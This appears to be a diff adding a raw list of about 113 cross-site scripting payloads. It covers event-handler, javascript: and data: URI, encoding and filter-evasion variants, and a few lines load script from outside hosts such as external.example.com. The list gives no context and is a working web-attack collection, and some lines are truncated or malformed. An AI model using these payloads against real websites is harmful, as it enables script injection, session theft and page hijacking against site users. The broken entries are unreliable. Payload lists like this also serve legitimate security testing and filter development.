@@ -1,0 +1,113 @@
+<script>/*%0A*/alert(1)//</script>
+<img src="javascript:/*%0A*/alert('XSS');">
+<svg onload=alert(1)>
+<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+<div onmouseover="alert(String.fromCharCode(88,83,83))">hover me!</div>
+<body onpageshow="alert('XSS')">
+<video><source onerror="alert(1)">
+<ScRipT>alert('XSS')</ScRipT>
+<IMG SRC="JaVaScRiPt:alert('XSS')">
+<audio src="x" onerror="alert(1);"></audio>
+<video poster=javascript:alert(1)//></video>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">XSS</a>
+<iframe src="data:text/html,%3C%73%63%72%69%70%74%3Ealert%28%27XSS%27%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
+JaVaScRiPt:alert(1)//';alert(2)//
+<svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+<script src="//external.example.com/malicious-script.js"></script>
+<div style="background:url('javascript:alert(1)')">
+<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(1)"></div>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<img src=`x` onerror=alert(1)>
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+&#60;script&#62;alert('XSS')&#60;/script&#62;
+<script>alert('XSS')<!--/script>
+<svg><!-- --> <onload alert(1) //
+<img src=x oneonerrorrror=alert(1)>
+<input type="image" src=x onerror="alert(1)">
+<keygen autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<meta content="&NewLine;bypass&NewLine;; onmouseover=alert(1)" http-equiv="default-style">
+<a href="%C0%AE%C0%AEa%C0%AEa%C0%AEa%C0%AEa%C0%AEa%C0%AEa%C0%AEj%C0%AEa%C0%AEv%C0%AEa%C0%AEs%C0%AEc%C0%A...
+<script>alert("\u0058\u0053\u0053")</script>
+<div style="width: expression(alert('XSS'));"></div>
+<svg height="50" width="50" onload=alert(1)>
+<script src="http://_:alert('XSS')"></script>
+<a href="javascript:alert('XSS')">click me</a>
+<iframe src="javascript:alert(1)" sandbox="allow-scripts"></iframe>
+<script>al\u0065rt(1)</script>
+<a href="jav&#x0D;ascript:alert('XSS')">click me</a>
+<script>alert(1)<
+<iframe src="http://victim.example/xss.html"<iframe>
+<a href="%E0%A4%B9%E0%A5%B1%E0%A5%B2script%E0%A4%B9%E0%A5%B1%E0%A5%B2:alert(1)//">link</a>
+<img """><script>alert("XSS")</script>">
+<iframe/src \/\/onload = alert(1)>
+<script>x="al";y="ert(1)";eval(x+y);</script>
+<!-- anything --!><script>alert(1)</script>
+<layer src="javascript:alert('XSS')">
+<bgsound src="javascript:alert('XSS');">
+<li style=list-style:url() onerror=alert(1)></li>
+<div style=content:url(javascript:alert(1))></div>
+<svg><style>{font-family&colon;<iframe/onload=confirm(1)></iframe>};
+<input/onmouseover="javaSCRIPT&#58confirm&lpar;1&rpar;" value=`` <type='text'>
+<img src="x` `<script>alert(1)</script>" alt="` `<script>alert(1)</script>">
+<img src=`xx:xx` onerror=eval('confir\u006d(1)')>
+<div style="background:url('x:confirm(1);')">
+<div style="width: expression(confirm(1));">
+<iframe src="data:text/html,%3C%73%63%72%69%70%74%3Econfirm(1)%3C%2F%73%63%72%69%70%74%3E"></iframe>
+<svg/onload='&lbrace;this["src"]=top["location"];confirm(1);&rbrace;'>
+<iframe srcdoc='<svg><script>confirm&lpar;1)</script>'></iframe>
+<math><mtext></mtext><annotation-xml encoding="application/xhtml+xml"><input autofocus onfocus=confirm(1)></annotation-xml></math>
+<table background="javascript:confirm(1)">
+<!--[if gte IE 9]><video><source onerror="confirm(1)"><![endif]-->
+<audio src="data:audio/x-wav;base64,UklGRigAAABXQVZFZm10IBAAAAABAAEAgD4AAAB9AAACABAAZGF0YYCAA..." onerror="confirm(1)">
+<object data=javascript:confirm(1)>
+<object type=text/html data="data:text/html;base64,PHNjcmlwdD5jb25maXJtKDEpPC9zY3JpcHQ+"></object>
+<embed src="javascript:confirm(1)">
+<embed type="image/svg+xml" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIG9ubG9hZD0iY29uZmlybSgxKSI+PC9zdmc+">
+<script src=data:,alert(1)></script>
+<details open ontoggle="confirm(1)">
+<b style="color:rgb(0,0,0);background-color:rgb(0,0,0);:focus{outline:none};" tabindex=1 onFocus=confirm(1)>Click me</b>
+<div style="position:absolute;width:100%;height:100%;top:0;left:0" onclick="confirm(1)">Click anywhere on the page</div>
+<vbscript:msgbox("XSS")>
+<marquee onstart="confirm(1)">
+<keygen focus keygenfocus="alert(1)" autofocus>
+<menu><command label="Click me" 
+icon="javascript:confirm(1);"></command></menu>
+<menu type="context"><menuitem label="Click me" icon="javascript:confirm(1);" onclick="confirm(1)"></menuitem></menu>
+<frameset onload=confirm(1)>
+<frame src="javascript:confirm(1)">
+<? echo '<SCR'.'IPT>alert(1)</SCR'.'IPT>'; ?>
+<event-source src="event.php" onmessage="confirm(1)">
+<a href="javascript:\u0063onfirm(1)">Click me</a>
+<isindex action="javascript:confirm(1)" type="submit">
+<style>@import 'javascript:confirm(1)';</style>
+<x:script xmlns:x="http://www.w3.org/1999/xhtml">confirm(1)</x:script>
+<xss style="xss:expression(confirm(1))">
+<meta http-equiv="refresh" content="0; url=javascript:confirm(1);">
+<iframe src="http://victim.example.com/#" srcdoc="<script>confirm(1)</script>"></iframe>
+<iframe src="javascript:confirm(1)" onload="this.src='about:blank'"></iframe>
+<div style="list-style-image: url(javascript:confirm(1))"></div>
+<q oncut="confirm(1)">Select and right-click to cut me</q>
+<div draggable="true" ondragend="confirm(1)">Drag me and drop me</div>
+<select autofocus onfocus="confirm(1)"><option>Item</option></select>
+<textarea id="x" style="display:none" onfocus="confirm(1)"></textarea><label for="x">Click me</label>
+<div style="background:url(javascript:confirm(1)) no-repeat fixed center;"></div>
+<base href="javascript:">
+<base href="javascript:confirm(1);//">
+<object type="text/x-scriptlet" data="http://example.com/scriptlet.sct"></object>
+<script src="data:text/javascript,confirm(1)"></script>
+<card onclick="confirm(1)">Click here</card>
+<iframe srcdoc="&lt;script&gt;confirm(1)&lt;/script&gt;"></iframe>
+<svg><animate onbegin=alert(1)>
+<title onpropertychange=alert(1)>
+<link href=//\ rel=stylesheet onerror=alert(1)>
+<q oncut=open()>alert(1)</q>
+<iframe/srcdoc="<svg><script href=//></svg>">
+<img src=1 href=1 onerror=alert(1) alt=1>
+<body onload=$.getScript`//x.ss`>
+<svg><set attributeName=onload to=alert(1)>
+<math><maction actiontype=alert href=//>XSS</maction></math>
+<keygen focus onfocus=alert(1)>
+'"><A HRef=\" AutoFocus OnFocus=top/**/?. >
+%27"><A%20HRef=\"%20AutoFocus%20OnFocus=top/**/?. >
